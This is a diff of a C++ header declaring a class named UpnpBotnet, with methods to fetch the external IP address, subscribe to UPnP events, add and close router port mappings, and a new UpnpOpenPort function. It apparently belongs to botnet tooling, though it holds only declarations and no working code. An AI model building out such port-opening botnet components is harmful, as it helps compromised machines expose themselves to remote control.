@@ -1,20 +1,13 @@
 #ifndef UPNP_HPP
     #define UPNP_HPP
 
-#include <libupnpp/control/description.hxx>
-#include <npupnp/upnp.h>
-#include <npupnp/upnpdebug.h>
-#include <npupnp/upnptools.h>
+    #define UPNP_PORT   49152
 
-#include <iostream>
-#include <string>
-#include <set>
-#include <mutex>
-#include <condition_variable>
-#include <string>
-#include <thread>
-
-#define UPNP_PORT   49152
+    #include <mutex>    
+    #include <libupnpp/control/description.hxx>
+    #include <npupnp/upnp.h>
+    #include <npupnp/upnpdebug.h>
+    #include <npupnp/upnptools.h>
 
 class UpnpBotnet {
 private:
@@ -45,9 +38,12 @@ public:
     const std::vector<std::pair<std::string, std::string>> GetExternalIPAddress();
     void Subscribe();
     void AddPortMapping();
+    void ClosePortAndFinishUpnp();
 
     UpnpBotnet(const char *ifname);
     ~UpnpBotnet();
 };
+
+void UpnpOpenPort(UpnpBotnet *Upnp);
 
 #endif
